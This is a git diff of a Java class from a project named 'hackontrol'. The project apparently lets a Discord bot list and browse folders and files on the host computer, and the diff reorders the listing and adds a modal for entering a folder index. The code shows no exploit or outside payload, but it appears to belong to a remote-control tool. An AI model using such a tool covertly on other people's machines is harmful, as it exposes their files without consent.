@@ -15,11 +15,16 @@ import com.khopan.hackontrol.widget.ControlWidget;
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.interactions.modals.Modal;
 
 public class FilePanel extends Panel {
 	private static final String PANEL_NAME = "file";
 
-	private static final Button BUTTON_LIST_ROOT = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");
+	private static final Button BUTTON_LIST_ROOT     = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");
+
+	private static final String MODAL_INSIDE         = "insideFolder";
 
 	private static final String PATHNAME_SYSTEM_ROOT = "SYSTEMROOT";
 
@@ -31,6 +36,7 @@ public class FilePanel extends Panel {
 	@Override
 	public void registeration() {
 		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(new File("D:\\VMImage"), context));
+		this.register(Registration.MODAL,  FilePanel.MODAL_INSIDE,     context -> {});
 	}
 
 	@Override
@@ -84,18 +90,6 @@ public class FilePanel extends Panel {
 		builder.append("**");
 		int index = 0;
 
-		if(!fileList.isEmpty()) {
-			builder.append("\n***File***");
-		}
-
-		for(File file : fileList) {
-			builder.append("\n`");
-			builder.append(++index);
-			builder.append(") ");
-			builder.append(file.getName());
-			builder.append('`');
-		}
-
 		if(!folderList.isEmpty()) {
 			builder.append("\n***Folder***");
 		}
@@ -108,12 +102,24 @@ public class FilePanel extends Panel {
 			builder.append('`');
 		}
 
+		if(!fileList.isEmpty()) {
+			builder.append("\n***File***");
+		}
+
+		for(File file : fileList) {
+			builder.append("\n`");
+			builder.append(++index);
+			builder.append(") ");
+			builder.append(file.getName());
+			builder.append('`');
+		}
+
 		File finalFolder = folder;
 		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> {
 			List<ItemComponent> list = new ArrayList<>();
 
 			if(!folderList.isEmpty()) {
-				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Inside", context -> this.buttonInside(context, fileList, folderList)));
+				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Inside", context -> this.buttonInside(context, folderList)));
 			}
 
 			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", context -> {
@@ -126,11 +132,21 @@ public class FilePanel extends Panel {
 		});
 	}
 
-	private void buttonInside(ButtonContext context, List<File> fileList, List<File> folderList) {
+	private void buttonInside(ButtonContext context, List<File> folderList) {
 		if(folderList.size() == 1) {
 			this.sendFileList(folderList.get(0), context);
 			HackontrolButton.deleteMessages(context);
 			return;
 		}
+
+		TextInput fileIndexInput = TextInput.create("fileIndex", "File Index", TextInputStyle.SHORT)
+				.setRequired(true)
+				.build();
+
+		Modal modal = Modal.create(FilePanel.MODAL_INSIDE, "Inside")
+				.addActionRow(fileIndexInput)
+				.build();
+
+		context.replyModal(modal).queue();
 	}
 }
